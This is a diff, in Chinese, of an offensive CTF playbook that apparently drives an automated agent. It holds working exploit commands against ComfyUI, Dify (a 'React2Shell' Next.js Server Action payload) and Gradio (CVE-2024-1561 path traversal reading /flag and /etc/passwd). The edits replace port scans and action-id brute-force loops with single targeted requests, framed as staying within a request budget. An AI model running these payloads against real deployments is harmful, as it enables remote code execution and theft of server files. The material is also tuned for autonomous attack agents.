@@ -97,12 +97,10 @@ print(s.recv(4096))
 # 注入后立即读回配置确认已写入
 curl -s "$TARGET/api/manager/db_mode?value=" | grep -oE 'security_level|allow_git_url_install' || true
 
-# 重启后等待服务就绪（不要盲目 sleep 固定时间后继续）
-for i in $(seq 1 20); do
-  code=$(curl -s -o /dev/null -w '%{http_code}' "$TARGET/api/manager/version" --max-time 3 2>/dev/null)
-  [ "$code" = "200" ] && echo ready && break
-  sleep 1
-done
+# 重启后等待服务就绪：最多确认 2 次（同一结构预算仅 3 次），间隔用 sleep 拉长
+sleep 3
+curl -s -o /dev/null -w '%{http_code}' "$TARGET/api/manager/version" --max-time 5
+# 若仍未就绪，再确认最后一次即可，不要循环轮询烧预算
 ```
 
 **拿 flag 的最终目标**：ComfyUI 题最终都是通过 RCE 读文件拿 flag，而不是无限调试配置：
@@ -137,15 +135,9 @@ curl -s -X POST "http://TARGET:PORT/git_url" -H 'Content-Type: application/json'
 curl -s http://TARGET:3000 | grep -oE 'data-public-api-prefix|SELF_HOSTED|Dify|next'
 ```
 
-**关键：先扫描同主机其他端口！**
-Dify 常与其他服务部署在同一主机上（如 HugeGraph、数据库等），先扫描常见端口找更简单的 RCE 入口：
-```bash
-for port in 22 80 443 3000 5001 8080 8443 3306 6379; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" "http://TARGET:$port" --max-time 5 2>/dev/null)
-  echo "port $port -> $code"
-done
-```
-如果发现其他服务（如 HugeGraph 8080、Gradio 7860 等），优先用它们的已知 CVE 打穿主机，再读 Dify 的 flag 文件。
+**关键：不要扫同主机其他端口！**
+平台对同一请求结构有 3 次硬预算，端口/网段扫描会一次性烧光并封死通道。
+只使用题目给的地址与 Memory 里已验证的端口/拓扑线索；确认其他服务用 `challenge_get_state`，不要 `for port in ...` 扫描。
 
 **React2Shell 验证与利用**（当当前指纹支持且同主机没有更合适入口时）：
 
@@ -163,15 +155,14 @@ curl -s -i -X POST http://TARGET:3000/ \
 
 # RCE payload 结构（利用 RSC 的 thenable/函数引用注入）：
 # 核心是构造一个 RSC 行，引用某个可执行 Server Action 并传恶意参数。
-# 不同 Dify 版本 action id 不同，用数字 0/1/2/3 轮流试：
-for aid in 0 1 2 3 4 x; do
-  echo "=== aid=$aid ==="
-  curl -s -i -X POST http://TARGET:3000/ \
-    -H "Next-Action: $aid" \
-    -H 'Content-Type: text/plain;charset=UTF-8' \
-    -d '["$@1"]' \
-    -w "\nHTTP:%{http_code}\n"
-done
+# 不同 Dify 版本 action id 不同——但**不要轮流试**（每个变体计一次预算，3 次即封）。
+# 先用下面这一条探测请求确定响应特征，再据下表选唯一 action id：
+curl -s -i -X POST http://TARGET:3000/ \
+  -H 'Next-Action: x' \
+  -H 'Content-Type: text/plain;charset=UTF-8' \
+  -d '["$@1"]' \
+  -w '\nHTTP:%{http_code}\n'
+# 观察响应特征（307/303/500/X-Action-Redirect），对照“版本差异”表选唯一 id，一次命中。
 ```
 
 ```bash
@@ -207,35 +198,25 @@ if resp.status_code in (307, 303):
 
 **版本差异与 fallback**：
 
-| 响应特征 | 可能版本 | 策略 |
+| 响应特征 | 可能版本 | 策略（先指纹，再选唯一 id，不轮流试）|
 |----------|----------|------|
 | 307→303→X-Action-Redirect 回显 | 可能存在可控动作回显 | 进一步验证命令输出/文件读取，不把回显直接当 flag |
-| 307→500 | 新版/Cloud 版 | 尝试不同 `$ACTION_ID_` 前缀（x, 0, 1, 2, 3）|
-| 307→200 无回显 | 已修复 | 放弃 React2Shell，扫同主机其他服务 |
+| 307→500 | 新版/Cloud 版 | 按响应头/页面特征选一个 `$ACTION_ID_` 前缀（默认 x），只发一次 |
+| 307→200 无回显 | 已修复 | 放弃 React2Shell，改用题目已知地址与已确认拓扑上的其他线索 |
 
-**不同 ACTION_ID 变体**：
+**不同 ACTION_ID 变体**：不要用循环逐个试；先根据上一次响应的 `X-Action-Redirect`/状态码/版本指纹确定唯一 id，再发一次：
 ```bash
-# 变体1: 默认 action id 'x'
+# 例：指纹已确认为默认前缀时，只发这一条
 curl -s -X POST http://TARGET:3000/ \
   -H 'Next-Action: x' \
   -H 'Content-Type: text/plain;charset=UTF-8' \
   -d '["$@1"]'
-
-# 变体2: 数字 action id
-for aid in 0 1 2 3 4; do
-  echo "=== aid=$aid ==="
-  curl -s -X POST http://TARGET:3000/ \
-    -H "Next-Action: $aid" \
-    -H 'Content-Type: text/plain;charset=UTF-8' \
-    -d '["$@1"]' \
-    -w "\nHTTP:%{http_code}\n"
-done
 ```
 
 **⚠️ 关键陷阱**：
 - **不要只看默认端口**——同主机可能运行多个服务。对发现的每个端口独立做协议/产品指纹，再选择与证据匹配的 CVE；端口号本身不是漏洞判据。
 - scanner.py 的 `build_rce_payload()` 默认 payload 在新版 Dify 上可能返回 500
-- 如果 10 轮内 React2Shell 无进展，立即切换到端口扫描同主机其他服务
+- 如果 React2Shell 单次命中失败且已无新证据，按“验证预算纪律”止损：不要扫端口或轮流试 id，改为复用 Memory 里已验证的凭据/路径，或 `challenge_get_state` 确认拓扑。
 
 ### 6.7 Gradio 任意文件读取（CVE-2024-1561）
 
@@ -244,16 +225,13 @@ done
 **核心**：`/file=` 参数未做路径限制，可读取服务器任意文件。
 
 ```bash
-# 直接读 flag（先试常见路径）
-curl -s 'http://TARGET:7860/file=/flag'
-curl -s 'http://TARGET:7860/file=/app/flag'
-curl -s 'http://TARGET:7860/file=../../../etc/passwd'
-
-# 若目标以 HTTP 80 端口暴露（反代到内部 7860）
-curl -s 'http://TARGET/file=/flag'
-
-# 指纹确认
+# 先指纹确认（一次）
 curl -s http://TARGET:7860/ | grep -oE 'gr-|gradio-container|/queue/'
+
+# 命中指纹后，优先一次直读最高价值路径（本平台 flag 通常在 /flag 或 /challenge/）
+curl -s 'http://TARGET:7860/file=/flag'
+
+# 只有 /flag 不存在（非 200）时，才根据响应特征换一个路径重试一次，不要连续枚举。
 ```
 
-**关键**：`/file=` 本身就是遍历入口，不需要登录；优先直读 `/flag`，读不到再枚举路径。
+**关键**：`/file=` 本身就是遍历入口，不需要登录；优先一次直读 `/flag`，读不到再据响应特征精确定位，不批量枚举路径。
